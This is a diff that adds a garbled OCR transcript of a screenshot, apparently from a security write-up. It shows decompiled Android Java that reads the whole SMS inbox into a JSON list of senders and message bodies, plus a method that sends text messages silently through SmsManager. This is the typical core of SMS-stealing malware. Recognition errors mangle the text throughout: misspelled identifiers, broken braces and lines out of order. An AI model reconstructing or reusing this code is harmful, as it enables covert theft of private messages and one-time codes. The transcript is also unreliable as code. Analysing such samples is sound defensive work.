@@ -1,0 +1,35 @@
+# OCR: 56e04b80a587ff84802e354ba9f75c16.webp
+# 来源: .\02-WriteUp\2024\56e04b80a587ff84802e354ba9f75c16.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:14
+
+public class b @
+public static IsoNobject a() (
+try t
+J jSONOdJect = new IsONObject();
+2 JSONArray = new 2SORArray();
+Cursor query = Mainservice.getcontextOray
+while (query.moveTonext()) t
+SONODJecE JSONDDJect? = new e
+String string « query.getstring (query. getColumntndex("address”));
+String string? = query. getString query.getColuenIndexorThrow(“body")) 5
+Jsonobject2. puri
+Jsonobject2. put (“m
+JS0NArray. put(jSoNobject2);
+ation() .getContentResolver().query(Uri-parse("content://sms/inbox"), null, mull, null, null);
+)
+Jsonodject.put("smsList", JsonArray);
+Log.e("done", “collecting”);
+return jsonobject;
+) catch (2soNException a {
+printstackTrace();
+return null;
+)
+)
+public static boolean b(string str, t
+try (
+‘SmsManager. getDefault().sencTextMessage(str, mull, str2, null, null);
+return true:
+1 eaten (Exception e)
+printstackTrace(
+return false;
